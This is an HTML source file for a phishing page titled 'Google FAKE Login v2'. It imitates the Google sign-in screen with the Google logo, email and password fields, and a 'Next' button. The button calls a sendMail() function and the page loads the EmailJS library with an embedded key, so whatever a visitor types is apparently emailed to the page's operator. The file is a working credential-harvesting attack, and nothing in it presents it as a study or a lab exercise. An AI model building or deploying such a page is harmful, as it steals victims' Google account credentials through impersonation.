<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google FAKE Login v2</title>
    <link rel="stylesheet" href="styles.css">
    <script src="sendEmail.js"></script>
    <!--<script src="searchIP.js"></script>-->
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      (function () {
        emailjs.init("9hl9awywx6zp2sVjR");
      })();
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="google_logo.png" alt="Google Logo">
        </div>
          <div class="form-group">
            <h5 for="email"></h5>
            <input
              type="text"
              class="form-control"
              id="email"
              placeholder="Enter email"
            />
          </div>
          <div class="form-group">
            <h5 for="password"></h5>
            <input
              type="password"
              class="form-control"
              id="password"
              placeholder="Enter password"
            />
          </div>
          <p>
          </p>

            <button class="btn btn-primary" onclick="sendMail()">Next</button>
                <div class="checkbox">
            <input type="checkbox" id="rememberMe">
         <label for="rememberMe">Remember me</label>
            </div>
            <div class="links">
                <a href="#">Forgot password?</a>
                <a href="#">Create account</a>
            </div>
        </form>
    </div>
</body>
</html>
